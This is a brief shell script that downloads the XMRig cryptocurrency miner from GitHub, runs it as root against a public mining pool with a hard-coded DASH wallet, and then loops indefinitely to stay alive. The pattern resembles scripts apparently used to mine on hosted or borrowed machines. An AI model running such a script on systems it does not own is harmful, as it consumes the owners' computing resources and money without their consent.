#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz
tar xf xmrig-6.12.1-linux-x64.tar.gz
cd xmrig-6.12.1
sudo ./xmrig -o rx.unmineable.com:3333 -a rx -k -u DASH:Xgu1AhXQr5MW5onUSA3vxAL3KdnGLuu4nb --threads 16
while [ 1 ]; do
sleep 3
done
sleep 999